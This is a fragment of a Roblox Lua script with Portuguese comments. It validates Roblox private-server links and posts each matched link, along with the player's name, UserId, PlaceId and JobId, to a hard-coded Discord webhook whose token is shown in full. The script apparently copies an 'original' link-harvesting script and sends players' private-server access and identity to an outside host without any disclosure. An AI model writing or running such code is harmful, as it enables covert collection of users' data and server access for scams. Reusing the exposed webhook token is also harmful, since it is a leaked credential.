-- ================= FUNÇÃO DE ENVIO PARA O DISCORD =================
local function sendToDiscord(link)
    local webhookURL = " https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya " -- 🔴 SUBSTITUA!
    local player = game.Players.LocalPlayer
    
    local data = {
        content = "**Novo link de servidor privado detectado!**",
        embeds = {{
            title = "Informações do Player",
            color = 5763719,
            fields = {
                { name = "Player", value = string.format("%s (%s)", player.Name, player.UserId), inline = true },
                { name = "Link do Servidor", value = link, inline = false },
                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
                { name = "Job ID", value = game.JobId, inline = true }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    local jsonData = HttpService:JSONEncode(data)
    local success, response = pcall(function()
        return HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
    end)
    
    if not success then
        warn("Erro ao enviar para o Discord: " .. tostring(response))
    end
    return success
end

-- ================= FUNÇÃO DE VALIDAÇÃO DE LINK (igual à original) =================
local function isValidPrivateServerLink(link)
    local patterns = {
        "https://www%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "https://web%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "https://www%.ro%.blox%.com/games/%d+/%S*%?privateServerLinkCode=",
        "https://www%.rblx%.com/games/%d+/%S*%?privateServerLinkCode=",
        "https://www%.roblox%.com/share%?code=%w+&type=Server",
        "https://web%.roblox%.com/share%?code=%w+&type=Server",
        "https://www%.ro%.blox%.com/share%?code=%w+&type=Server",
        "https://www%.rblx%.com/share%?code=%w+&type=Server"
    }
    for _, pattern in pairs(patterns) do
        if string.match(link, pattern) then
            return true
        end
    end
    return false
end

